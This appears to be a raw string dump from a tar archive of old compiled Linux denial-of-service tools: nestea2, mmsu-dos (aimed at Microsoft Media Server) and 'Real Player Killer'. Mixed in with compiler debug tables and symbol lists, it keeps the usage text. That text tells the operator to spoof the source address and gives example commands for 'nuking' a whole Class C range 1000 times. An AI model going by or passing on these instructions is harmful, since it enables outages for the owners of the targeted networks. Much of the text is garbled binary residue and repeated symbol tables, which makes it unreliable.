            "EEhD",
            "EPEP,",
            "EPE@P",
            "E,1fEP",
            "1fEP",
            "QE\u060bUM",
            "E\u053bE\u044bE\u060d",
            ")\u02cbE)\u060bU\u0508",
            "EE\ub989j",
            "U\u0709Pj",
            "P] u,hZ",
            "e[^]",
            "Uu>E",
            "1'EP",
            "REPEP",
            "\u0403;u[]",
            "[1;34mNestea v2 ",
            "[0;34moriginally by",
            "[0m: ",
            "[1;34mhumble ",
            "[0;34m+ ",
            "[1;34mttol mods",
            "[0;34mColor and Instructions was done by ",
            "[0m: ",
            "[1;34mttol",
            "[1;34mNote",
            "[0m : ",
            "[1;34mttol released Nestea v2.  humble had nothing to do with ",
            "       it, don't nag him about it.  -ttol@ttol.net",
            "[1;34mraw socket",
            "IP_HDRINCL",
            "[1;34mWhat the hell kind of IP address is that?",
            "%d.%d.%d.%d",
            "[1;34mError, arg2(startip) ",
            "[0m: ",
            "[0;34mNeed an ip that contains 4 zones",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 1 of start ip is incorrect                        (greater than 255)",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 2 of start ip is incorrect                        (greater than 255)",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 3 of start ip is incorrect                        (greater than 255)",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 4 of start ip is incorret                        (greater than 255)",
            "[1;34mError, arg3(endip) ",
            "[0m: [[0;34mNeed an ip that                        contains 4 zones[[0m",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 1 of end ip is incorrect                        (greater than 255)",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 2 of end ip is incorrect                        (greater than 255)",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 3 of end ip is incorrect",
            "                       (greater than 255)",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 4 of end ip is incorrect",
            "                       (greater than 255)",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 1 of start ip and end ip is different",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 2 of start ip and end ip is different",
            "[1;34mError ",
            "[0m: ",
            "[0;34mZone 3 of start ip and end ip is different",
            "s:t:n:q",
            "[1;34mDeath ",
            "[0;34mon flaxen wings (",
            "[1;34myet again",
            "[0;34m)",
            "[0m:",
            "[1;34mFrom",
            "[0m: ",
            "[0;34m%15s.%d",
            "[1;34mTo",
            "[0m: ",
            "[0;34m%15s - %s.%d",
            "[1;34mAmt",
            "[0m: ",
            "[0;34m%5d",
            "[0;34m[",
            "[1;34mquiet mode",
            "[0;34m] ",
            "[0;34mEach'",
            "[1;34m.",
            "[0;34m' represents a nuked ip.  ",
            "[0;34m[",
            "[0;34m%s ",
            "[1;34m[ ",
            "[0;34mWhat the ",
            "[1;34mhell ",
            "[0;34mkind of IP address is that?",
            "[0;34md",
            "[1;34m00",
            "[0;34mm ",
            "[1;34m.",
            "[0;34m]",
            "sendto",
            "[1;34mnestea2 ",
            "[0;34msource startIP endIP ",
            "[1;34m[",
            "[0;34m-s src port",
            "[1;34m] [",
            "[0;34m-t dest port",
            "[1;34m] [",
            "[0;34m-n quantity",
            "[1;34m] [",
            "[0;34m-q",
            "[1;34m]",
            "[0;34msource   ",
            "[0m: ",
            "[1;34mThis is the source IP to nestea from, make it a spoof",
            "[0;34mstartIP  ",
            "[0m: ",
            "[1;34mFrom which IP should we start from? ",
            "[1;34m(",
            "[0;34meg 153.35.85.1",
            "[1;34m)",
            "[0;34mendIP    ",
            "[0m: ",
            "[1;34mFrom which IP should we end with?   ",
            "[1;34m(",
            "[0;34meg 153.35.95.255",
            "[1;34m)",
            "[0;34msrc port ",
            "[0m: ",
            "[1;34mThis is the source port to spoof from ",
            "[1;34m(",
            "[0;34mOPTIONAL",
            "[1;34m)",
            "[0;34mdest port",
            "[0m: ",
            "[1;34mThis is the destination port to nestea to ",
            "[1;34m(",
            "[0;34mOPTIONAL",
            "[1;34m)",
            "[0;34mquantity ",
            "[0m: ",
            "[1;34mThis is how many times to nestea the victim ",
            "[1;34m(",
            "[0;34mperfered is 1000",
            "[1;34m)",
            "[0;34m-q       ",
            "[0m: ",
            "[1;34mThis is quiet mode so you don't see the ",
            "[0;34md",
            "[1;34m00",
            "[0;34mm",
            "[1;34m's",
            "[0;34mExample  ",
            "[0m: ",
            "[1;34mnestea2 127.0.0.1 153.35.85.1 153.35.85.255 -n 1000",
            "[0;34mThe above was to hit a whole Class C of 153.35.85 with the return ",
            "address from 127.0.0.1 doing it 1000 times",
            "[0;34mExample2 ",
            "[0m: ",
            "[1;34mnestea2 153.35.85.32 153.35.85.32 153.85.35.32 -n 1000",
            "[0;34mThe above was to hit 153.35.85.32 with the source 153.35.85.32 ",
            "doing it 1000 times",
            "[1;34mI perfer example2, probably because it is the lazy man's way out",
            "                             ",
            "[1;5;34mNOT TO BE DISTRIBUTED!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "nestea2.c",
            "endip",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "usage",
            "_fp_hw",
            "perror@@GLIBC_2.0",
            "fprintf@@GLIBC_2.0",
            "bcopy@@GLIBC_2.0",
            "inet_ntoa@@GLIBC_2.0",
            "random@@GLIBC_2.0",
            "_init",
            "malloc@@GLIBC_2.0",
            "sendto@@GLIBC_2.0",
            "__deregister_frame_info@@GLIBC_2.0",
            "name_resolve",
            "stderr@@GLIBC_2.0",
            "setsockopt@@GLIBC_2.0",
            "time@@GLIBC_2.0",
            "_start",
            "startip",
            "send_frags",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "_fini",
            "memcpy@@GLIBC_2.0",
            "getopt_long@@GLIBC_2.0",
            "gethostbyname@@GLIBC_2.0",
            "bzero@@GLIBC_2.0",
            "exit@@GLIBC_2.0",
            "atoi@@GLIBC_2.0",
            "sscanf@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "free@@GLIBC_2.0",
            "_end",
            "htons@@GLIBC_2.0",
            "optarg@@GLIBC_2.0",
            "_IO_stdin_used",
            "srandom@@GLIBC_2.0",
            "sprintf@@GLIBC_2.0",
            "__data_start",
            "socket@@GLIBC_2.0",
            "__gmon_start__",
            "strcpy@@GLIBC_2.0",
            "datapool/bin/mmsu-dos",
            "0100755",
            "0000000",
            "0000000",
            "00000032570",
            "07100656635",
            "013641",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "connect",
            "socket",
            "write",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "read",
            "bcopy",
            "gethostbyname",
            "stderr",
            "htons",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "01^PTRh",
            "} h@",
            "j0h4",
            "jphd",
            "jXhl",
            "j@h\u011a",
            "\u0403;u[]",
            "usage: %s <host/ip>",
            "Fatal Error: Can't connect to Microsoft Media Server.",
            "MMS ",
            "MMS ",
            "MMS ",
            "MMS ",
            "MMS \t",
            "gfffff",
            "MMS ",
            "MMS ",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
            "__uint64_t:t(15,14)=(0,7)",
            "__qaddr_t:t(15,15)=(15,16)=*(15,6)",
            "__dev_t:t(15,17)=(15,5)",
            "__uid_t:t(15,18)=(15,3)",
            "__gid_t:t(15,19)=(15,3)",
            "__ino_t:t(15,20)=(15,4)",
            "__mode_t:t(15,21)=(15,3)",
            "__nlink_t:t(15,22)=(15,3)",
            "__off_t:t(15,23)=(0,3)",
            "__loff_t:t(15,24)=(15,6)",
            "__pid_t:t(15,25)=(0,1)",
            "__ssize_t:t(15,26)=(0,1)",
            "__rlim_t:t(15,27)=(0,3)",
            "__rlim64_t:t(15,28)=(15,6)",
            "__id_t:t(15,29)=(15,3)",
            "__fsid_t:t(15,30)=(15,31)=s8__val:(15,32)=ar(0,1);0;1;(0,1),0,64;;",
            "__daddr_t:t(15,33)=(0,1)",
            "__caddr_t:t(15,34)=(10,2)",
            "__time_t:t(15,35)=(0,3)",
            "__swblk_t:t(15,36)=(0,3)",
            "__clock_t:t(15,37)=(0,3)",
            "__fd_mask:t(15,38)=(0,5)",
            "__fd_set:t(15,39)=(15,40)=s128fds_bits:(15,41)=ar(0,1);0;31;(15,38),0,1024;;",
            "__key_t:t(15,42)=(0,1)",
            "__ipc_pid_t:t(15,43)=(0,9)",
            "__blkcnt_t:t(15,44)=(0,3)",
            "__blkcnt64_t:t(15,45)=(15,6)",
            "__fsblkcnt_t:t(15,46)=(15,4)",
            "__fsblkcnt64_t:t(15,47)=(15,5)",
            "__fsfilcnt_t:t(15,48)=(15,4)",
            "__fsfilcnt64_t:t(15,49)=(15,5)",
            "__ino64_t:t(15,50)=(15,4)",
            "__off64_t:t(15,51)=(15,24)",
            "__t_scalar_t:t(15,52)=(0,1)",
            "__t_uscalar_t:t(15,53)=(0,4)",
            "__intptr_t:t(15,54)=(0,1)",
            "../linuxthreads/sysdeps/pthread/bits/pthreadtypes.h",
            "../sysdeps/unix/sysv/linux/bits/sched.h",
            "__sched_param:T(18,1)=s4sched_priority:(0,1),0,32;;",
            "_pthread_fastlock:T(17,1)=s8__status:(0,3),0,32;__spinlock:(0,1),32,32;;",
            "_pthread_descr:t(17,2)=(17,3)=*(17,4)=xs_pthread_descr_struct:",
            "pthread_attr_t:t(17,5)=(17,6)=s36__detachstate:(0,1),0,32;__schedpolicy:(0,1),32,32;__schedparam:(18,1),64,32;__inheritsched:(0,1),96,32;__scope:(0,1),128,32;__guardsize:(16,1),160,32;__stackaddr_set:(0,1),192,32;__stackaddr:(17,7)=*(0,19),224,32;__stacksize:(16,1),256,32;;",
            "pthread_cond_t:t(17,8)=(17,9)=s12__c_lock:(17,1),0,64;__c_waiting:(17,2),64,32;;",
            "pthread_condattr_t:t(17,10)=(17,11)=s4__dummy:(0,1),0,32;;",
            "pthread_key_t:t(17,12)=(0,4)",
            "pthread_mutex_t:t(17,13)=(17,14)=s24__m_reserved:(0,1),0,32;__m_count:(0,1),32,32;__m_owner:(17,2),64,32;__m_kind:(0,1),96,32;__m_lock:(17,1),128,64;;",
            "pthread_mutexattr_t:t(17,15)=(17,16)=s4__mutexkind:(0,1),0,32;;",
            "pthread_once_t:t(17,17)=(0,1)",
            "pthread_rwlock_t:t(17,18)=(17,19)=s32__rw_lock:(17,1),0,64;__rw_readers:(0,1),64,32;__rw_writer:(17,2),96,32;__rw_read_waiting:(17,2),128,32;__rw_write_waiting:(17,2),160,32;__rw_kind:(0,1),192,32;__rw_pshared:(0,1),224,32;;",
            "pthread_rwlockattr_t:t(17,20)=(17,21)=s8__lockkind:(0,1),0,32;__pshared:(0,1),32,32;;",
            "pthread_t:t(17,22)=(0,5)",
            "wchar_t:t(19,1)=(0,3)",
            "wint_t:t(19,2)=(0,4)",
            "_G_int16_t:t(14,1)=(0,8)",
            "_G_int32_t:t(14,2)=(0,1)",
            "_G_uint16_t:t(14,3)=(0,9)",
            "_G_uint32_t:t(14,4)=(0,4)",
            "_IO_stdin_used:G(0,1)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "GCC: (GNU) 2.95.2 19991024 (release)",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            "01.01",
            ".symtab",
            ".strtab",
            ".shstrtab",
            ".interp",
            ".note.ABI-tag",
            ".hash",
            ".dynsym",
            ".dynstr",
            ".gnu.version",
            ".gnu.version_r",
            ".rel.got",
            ".rel.bss",
            ".rel.plt",
            ".init",
            ".plt",
            ".text",
            ".fini",
            ".rodata",
            ".data",
            ".eh_frame",
            ".ctors",
            ".dtors",
            ".got",
            ".dynamic",
            ".bss",
            ".stab",
            ".stabstr",
            ".comment",
            ".note",
            "initfini.c",
            "gcc2_compiled.",
            "init.c",
            "Letext",
            "crtstuff.c",
            "__DTOR_LIST__",
            "completed.4",
            "__do_global_dtors_aux",
            "__EH_FRAME_BEGIN__",
            "fini_dummy",
            "object.11",
            "frame_dummy",
            "init_dummy",
            "force_to_data",
            "__CTOR_LIST__",
            "__do_global_ctors_aux",
            "__CTOR_END__",
            "__DTOR_END__",
            "__FRAME_END__",
            "mmsu-dos.c",
            "packet2",
            "_DYNAMIC",
            "_etext",
            "__register_frame_info@@GLIBC_2.0",
            "write@@GLIBC_2.0",
            "_fp_hw",
            "fprintf@@GLIBC_2.0",
            "sock",
            "packet5",
            "bcopy@@GLIBC_2.0",
            "_init",
            "packet4",
            "__deregister_frame_info@@GLIBC_2.0",
            "stderr@@GLIBC_2.0",
            "packet1",
            "_start",
            "packet3",
            "inet_addr@@GLIBC_2.0",
            "__bss_start",
            "main",
            "__libc_start_main@@GLIBC_2.0",
            "data_start",
            "packet6",
            "_fini",
            "gethostbyname@@GLIBC_2.0",
            "_edata",
            "_GLOBAL_OFFSET_TABLE_",
            "_end",
            "htons@@GLIBC_2.0",
            "connect@@GLIBC_2.0",
            "_IO_stdin_used",
            "__data_start",
            "socket@@GLIBC_2.0",
            "read@@GLIBC_2.0",
            "packet7",
            "__gmon_start__",
            "datapool/bin/rpk",
            "0100755",
            "0000000",
            "0000000",
            "00000034271",
            "07100656671",
            "012671",
            "ustar  ",
            "root",
            "root",
            "/lib/ld-linux.so.2",
            "__gmon_start__",
            "libc.so.6",
            "printf",
            "memcpy",
            "perror",
            "socket",
            "fprintf",
            "inet_addr",
            "__deregister_frame_info",
            "rand",
            "sendto",
            "bcopy",
            "gethostbyname",
            "stderr",
            "htons",
            "exit",
            "atoi",
            "_IO_stdin_used",
            "__libc_start_main",
            "__register_frame_info",
            "GLIBC_2.0",
            "1^PTRh",
            "QVh|",
            "E1fE",
            "fE1fu",
            "e[^]",
            "WVSE",
            "M ]$fEfUfMf]eM",
            ")\u0208EE",
            ")\u020diz",
            "fEfE",
            "fE1fEP7",
            "fE\u07031fEP",
            "fE\u0783E",
            "fEfE",
            "EPh`",
            "EPht",
            "1fEPE",
            "P1fE|",
            "1fEPK ",
            "[^_]",
            "E}uLE",
            "EPEP",
            "E}u#hQ",
            "qEPh",
            "EPEPj",
            "EPEPS u3h",
            "\u0403;u[]",
            "Usage: %s <source_addr> <dest_addr> <low port> <high port>",
            "Real Player Killer - http://www.rootshell.com/",
            "Unable to open raw socket.",
            "Unable to lookup source address.",
            "Unable to lookup destination address.",
            "sendpkt_udp",
            "Error sending the UDP packet.",
            "Done!",
            "init.c",
            "/home/lepied/RPM/BUILD/glibc-2.1/csu/",
            "gcc2_compiled.",
            "int:t(0,1)=r(0,1);0020000000000;0017777777777;",
            "char:t(0,2)=r(0,2);0;127;",
            "long int:t(0,3)=r(0,1);0020000000000;0017777777777;",
            "unsigned int:t(0,4)=r(0,1);0000000000000;0037777777777;",
            "long unsigned int:t(0,5)=r(0,1);0000000000000;0037777777777;",
            "long long int:t(0,6)=r(0,1);01000000000000000000000;0777777777777777777777;",
            "long long unsigned int:t(0,7)=r(0,1);0000000000000;01777777777777777777777;",
            "short int:t(0,8)=r(0,8);-32768;32767;",
            "short unsigned int:t(0,9)=r(0,9);0;65535;",
            "signed char:t(0,10)=r(0,10);-128;127;",
            "unsigned char:t(0,11)=r(0,11);0;255;",
            "float:t(0,12)=r(0,1);4;0;",
            "double:t(0,13)=r(0,1);8;0;",
            "long double:t(0,14)=r(0,1);12;0;",
            "complex int:t(0,15)=s8real:(0,1),0,32;imag:(0,1),32,32;;",
            "complex float:t(0,16)=r(0,16);4;0;",
            "complex double:t(0,17)=r(0,17);8;0;",
            "complex long double:t(0,18)=r(0,18);12;0;",
            "void:t(0,19)=(0,19)",
            "../include/libc-symbols.h",
            "/home2/lepied/RPM/BUILD/glibc-2.1/build-i386-linux/config.h",
            "../include/libintl.h",
            "../intl/libintl.h",
            "../include/features.h",
            "../include/sys/cdefs.h",
            "../misc/sys/cdefs.h",
            "/usr/lib/gcc-lib/i586-mandrake-linux/2.95.2/include/stddef.h",
            "../include/locale.h",
            "../locale/locale.h",
            "lconv:T(10,1)=s48decimal_point:(10,2)=*(0,2),0,32;thousands_sep:(10,2),32,32;grouping:(10,2),64,32;int_curr_symbol:(10,2),96,32;currency_symbol:(10,2),128,32;mon_decimal_point:(10,2),160,32;mon_thousands_sep:(10,2),192,32;mon_grouping:(10,2),224,32;positive_sign:(10,2),256,32;negative_sign:(10,2),288,32;int_frac_digits:(0,2),320,8;frac_digits:(0,2),328,8;p_cs_precedes:(0,2),336,8;p_sep_by_space:(0,2),344,8;n_cs_precedes:(0,2),352,8;n_sep_by_space:(0,2),360,8;p_sign_posn:(0,2),368,8;n_sign_posn:(0,2),376,8;;",
            "../include/xlocale.h",
            "../locale/xlocale.h",
            "__locale_struct:T(13,1)=s36__locales:(13,2)=ar(0,1);0;5;(13,3)=*(13,4)=xslocale_data:,0,192;__ctype_b:(13,5)=*(0,9),192,32;__ctype_tolower:(13,6)=*(0,1),224,32;__ctype_toupper:(13,6),256,32;;",
            "__locale_t:t(13,7)=(13,8)=*(13,1)",
            "../sysdeps/unix/sysv/linux/_G_config.h",
            "../sysdeps/unix/sysv/linux/bits/types.h",
            "size_t:t(16,1)=(0,4)",
            "__u_char:t(15,1)=(0,11)",
            "__u_short:t(15,2)=(0,9)",
            "__u_int:t(15,3)=(0,4)",
            "__u_long:t(15,4)=(0,5)",
            "__u_quad_t:t(15,5)=(0,7)",
            "__quad_t:t(15,6)=(0,6)",
            "__int8_t:t(15,7)=(0,10)",
            "__uint8_t:t(15,8)=(0,11)",
            "__int16_t:t(15,9)=(0,8)",
            "__uint16_t:t(15,10)=(0,9)",
            "__int32_t:t(15,11)=(0,1)",
            "__uint32_t:t(15,12)=(0,4)",
            "__int64_t:t(15,13)=(0,6)",
